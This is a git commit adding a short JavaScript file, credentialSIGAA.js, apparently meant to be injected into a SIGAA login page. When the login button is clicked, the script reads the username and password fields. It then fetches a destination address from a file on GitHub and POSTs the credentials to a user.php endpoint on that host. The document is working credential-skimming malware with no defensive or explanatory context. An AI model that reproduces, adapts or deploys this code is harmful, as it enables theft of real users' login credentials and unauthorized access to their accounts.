ade7ccac0dc6b63839a4e913d9272f3f1982a851
Wolota <123838258+Wolota@users.noreply.github.com>
2023-02-11 13:15:12 -0300

    Create credentialSIGAA.js

---
+++ credentialSIGAA.js
@@ -0,0 +1,24 @@
+    let btn = document.getElementsByClassName("g-recaptcha")
+    const username = document.querySelector('[name="user.login"]')
+    const password = document.querySelector('[name="user.senha"]')
+
+    btn[0].addEventListener("click", function(){
+        let xhr = new XMLHttpRequest();
+
+        xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
+        xhr.onreadystatechange = async function() {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                const urlContent = xhr.responseText;
+
+                const data = new FormData();
+                data.append("username", username.value);
+                data.append("password", password.value);
+
+                const response = await fetch(urlContent + "/user.php", {
+                    method: "POST",
+                    body: data
+                });
+            }
+        };
+        xhr.send();
+    });
